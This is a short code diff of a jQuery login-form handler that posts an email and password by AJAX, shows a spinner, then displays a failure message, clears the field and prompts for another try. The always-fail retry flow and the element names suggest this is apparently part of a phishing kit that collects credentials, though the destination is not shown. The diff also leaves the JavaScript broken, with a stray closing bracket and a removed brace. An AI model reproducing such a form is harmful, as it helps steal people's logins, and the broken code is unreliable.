@@ -56,13 +56,13 @@
                 method: "post",
                 data: {email: input4email, password: input4passwd},
                 processData: true,
+                      })  
                 beforeSend: function(xhr){
                     $('#showerror').removeClass('alert').text('')
                     $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
-                },                        
+                                   
                 complete: function(feedback) {
-                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
-                       console.log(feedback);
+                       $('#showerror').html('<div class="alert alert-danger">Could not reach server, please try again later.</div>');
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
